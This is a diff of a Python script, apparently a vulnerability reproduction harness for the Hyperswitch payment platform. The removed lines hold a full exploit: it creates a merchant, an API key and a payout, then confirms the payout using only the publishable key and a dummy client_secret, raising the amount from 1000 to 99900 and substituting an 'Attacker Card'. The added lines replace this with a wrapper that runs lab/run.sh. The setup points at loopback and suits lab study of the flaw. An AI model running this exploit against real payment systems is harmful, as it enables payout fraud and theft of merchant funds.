@@ -222,243 +222,33 @@ def _cprint(*args, **kwargs):
 print_abraxas_banner()
 _builtins.print = _cprint
 
-from __future__ import annotations
+"""Hyperswitch payout confirm ignores client_secret equality. Loopback lab runner."""
 
-import json
+import stat
+import subprocess
 import sys
-import uuid
-import urllib.error
-import urllib.request
+from pathlib import Path
 
-BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18083").rstrip("/")
-ADMIN = "test_admin"
-MID = "hs_po_" + uuid.uuid4().hex[:8]
-ORIG_AMOUNT = 1000
-RAISED_AMOUNT = 99900
-DUMMY_SECRET = "payout_not_the_real_client_secret"
+HERE = Path(__file__).resolve().parent
+LAB = HERE / "lab"
+RUN_SH = LAB / "run.sh"
 
 
-def http(method: str, path: str, *, body=None, headers=None) -> tuple[int, str]:
-    url = path if path.startswith("http") else BASE + path
-    hdrs = {"User-Agent": "hs-payout-secret-lab"}
-    if headers:
-        hdrs.update(headers)
-    data = None
-    if body is not None:
-        data = json.dumps(body).encode()
-        hdrs.setdefault("Content-Type", "application/json")
-    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
-    try:
-        with urllib.request.urlopen(req, timeout=60) as resp:
-            return resp.status, resp.read().decode("utf-8", "replace")
-    except urllib.error.HTTPError as exc:
-        return exc.code, exc.read().decode("utf-8", "replace")
-
-
-def j(method: str, path: str, body=None, headers=None) -> tuple[int, dict | str]:
-    code, text = http(method, path, body=body, headers=headers)
-    try:
-        return code, json.loads(text)
-    except json.JSONDecodeError:
-        return code, text
-
-
-def main() -> None:
-    print(f"IOC base={BASE} merchant_id={MID}")
-    s, b = http("GET", "/health")
-    print(f"IOC health status={s} body={b!r}"[:180])
-
-    s, acct = j(
-        "POST",
-        "/accounts",
-        {
-            "merchant_id": MID,
-            "merchant_name": "Lab Payout Merchant",
-            "merchant_details": {
-                "primary_contact_person": "Lab",
-                "primary_email": "lab@localhost.invalid",
-            },
-            "return_url": "https://127.0.0.1/success",
-        },
-        headers={"api-key": ADMIN},
+def main() -> int:
+    if not RUN_SH.is_file():
+        print("FAIL lab/run.sh missing")
+        return 1
+    mode = RUN_SH.stat().st_mode
+    if not mode & stat.S_IXUSR:
+        RUN_SH.chmod(mode | stat.S_IXUSR)
+    completed = subprocess.run(
+        ["/bin/bash", str(RUN_SH), *sys.argv[1:]],
+        cwd=LAB,
+        check=False,
     )
-    print(f"IOC accounts status={s} snippet={json.dumps(acct)[:240] if not isinstance(acct, str) else acct[:240]!r}")
-    if s >= 300 or not isinstance(acct, dict):
-        print("FAIL create merchant")
-        raise SystemExit(1)
-    merchant_id = acct.get("merchant_id") or MID
-    pk = acct.get("publishable_key")
-    print(f"IOC merchant_id={merchant_id} pk={str(pk)[:20]}…")
-
-    s, key = j(
-        "POST",
-        f"/api_keys/{merchant_id}",
-        {"name": "lab", "expiration": "2069-09-23T01:02:03.000Z"},
-        headers={"api-key": ADMIN},
-    )
-    if s >= 300 or not isinstance(key, dict) or not key.get("api_key"):
-        print(f"FAIL create api key {key}")
-        raise SystemExit(1)
-    api_key = key["api_key"]
-    auth = {"api-key": api_key}
-    if not pk:
-        pk = acct.get("publishable_key")
-    print(f"IOC api_key_len={len(api_key)}")
-
-    s, wp = j(
-        "POST",
-        f"/account/{merchant_id}/connectors",
-        {
-            "connector_type": "payout_processor",
-            "connector_name": "worldpayxml",
-            "connector_account_details": {
-                "auth_type": "SignatureKey",
-                "api_secret": "LABMERCH",
-                "api_key": "lab_user",
-                "key1": "lab_pass",
-            },
-            "test_mode": True,
-            "disabled": False,
-            "payment_methods_enabled": [
-                {
-                    "payment_method": "card",
-                    "payment_method_types": [
-                        {
-                            "payment_method_type": "credit",
-                            "card_networks": ["Visa"],
-                            "minimum_amount": 1,
-                            "maximum_amount": 68607706,
-                            "recurring_enabled": True,
-                            "installment_payment_enabled": True,
-                        }
-                    ],
-                }
-            ],
-        },
-        headers=auth,
-    )
-    print(f"IOC payout MCA status={s} snippet={json.dumps(wp)[:240] if not isinstance(wp, str) else wp[:240]!r}")
-
-    create_body = {
-        "amount": ORIG_AMOUNT,
-        "currency": "USD",
-        "confirm": False,
-        "auto_fulfill": False,
-        "payout_type": "card",
-        "description": "lab payout confirm secret",
-        "payout_method_data": {
-            "card": {
-                "card_number": "4111111111111111",
-                "expiry_month": "03",
-                "expiry_year": "2030",
-                "card_holder_name": "Lab Card",
-            }
-        },
-        "billing": {
-            "address": {
-                "line1": "1 Lab",
-                "city": "Lab",
-                "state": "CA",
-                "zip": "94107",
-                "country": "US",
-                "first_name": "Lab",
-                "last_name": "User",
-            }
-        },
-        "customer": {
-            "email": "payout-lab@localhost.invalid",
-            "name": "Lab Payout",
-        },
-    }
-    s, po = j("POST", "/payouts/create", create_body, headers=auth)
-    print(f"IOC payouts.create status={s} snippet={json.dumps(po)[:400] if not isinstance(po, str) else po[:400]!r}")
-    if s >= 300 or not isinstance(po, dict) or not po.get("payout_id"):
-        print("FAIL create payout")
-        raise SystemExit(1)
-    payout_id = po["payout_id"]
-    real_secret = po.get("client_secret")
-    before_amt = po.get("amount")
-    before_status = po.get("status")
-    print(f"IOC payout_id={payout_id} amount={before_amt} status={before_status} secret_prefix={str(real_secret)[:24]}")
-    if before_amt != ORIG_AMOUNT:
-        print(f"FAIL unexpected create amount {before_amt}")
-        raise SystemExit(1)
-
-    # Control: payments confirm with dummy client_secret + pk_ should fail.
-    s_pay, pay = j(
-        "POST",
-        "/payments",
-        {
-            "amount": 100,
-            "currency": "USD",
-            "confirm": False,
-            "description": "control payment",
-        },
-        headers=auth,
-    )
-    if isinstance(pay, dict) and pay.get("payment_id") and pay.get("client_secret"):
-        s_c, ctrl = j(
-            "POST",
-            f"/payments/{pay['payment_id']}/confirm",
-            {"client_secret": DUMMY_SECRET},
-            headers={"api-key": pk},
-        )
-        print(f"IOC payments.confirm dummy-secret status={s_c} snippet={json.dumps(ctrl)[:200] if not isinstance(ctrl, str) else ctrl[:200]!r}")
-        if s_c == 200:
-            print("FAIL payments confirm accepted dummy client_secret (control broken)")
-            raise SystemExit(1)
-    else:
-        print(f"IOC skip payments control create_status={s_pay}")
-
-    s, conf = j(
-        "POST",
-        f"/payouts/{payout_id}/confirm",
-        {
-            "client_secret": DUMMY_SECRET,
-            "amount": RAISED_AMOUNT,
-            "currency": "USD",
-            "auto_fulfill": True,
-            "payout_type": "card",
-            "payout_method_data": {
-                "card": {
-                    "card_number": "4111111111111111",
-                    "expiry_month": "03",
-                    "expiry_year": "2030",
-                    "card_holder_name": "Attacker Card",
-                }
-            },
-        },
-        headers={"api-key": pk},
-    )
-    print(f"IOC payouts.confirm status={s} snippet={json.dumps(conf)[:500] if not isinstance(conf, str) else conf[:500]!r}")
-
-    s_r, got = j("GET", f"/payouts/{payout_id}", headers=auth)
-    print(f"IOC payouts.retrieve status={s_r} snippet={json.dumps(got)[:400] if not isinstance(got, str) else got[:400]!r}")
-    if not isinstance(got, dict):
-        print("FAIL retrieve payout")
-        raise SystemExit(1)
-    after_amt = got.get("amount")
-    after_status = got.get("status")
-    print(f"IOC after amount={after_amt} status={after_status}")
-
-    if s in {401, 403} or (
-        isinstance(conf, dict)
-        and "client_secret" in json.dumps(conf).lower()
-        and "invalid" in json.dumps(conf).lower()
-        and after_amt == ORIG_AMOUNT
-    ):
-        print("FAIL confirm rejected dummy client_secret (bound)")
-        raise SystemExit(1)
-    if after_amt == RAISED_AMOUNT:
-        print("SUCCESS Hyperswitch payout confirm unbound client_secret amount raise")
-        raise SystemExit(0)
-    if s == 200 and after_amt != ORIG_AMOUNT:
-        print(f"SUCCESS amount changed to {after_amt} with dummy client_secret")
-        raise SystemExit(0)
-    print("FAIL amount not raised")
-    raise SystemExit(1)
+    return int(completed.returncode)
 
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
 
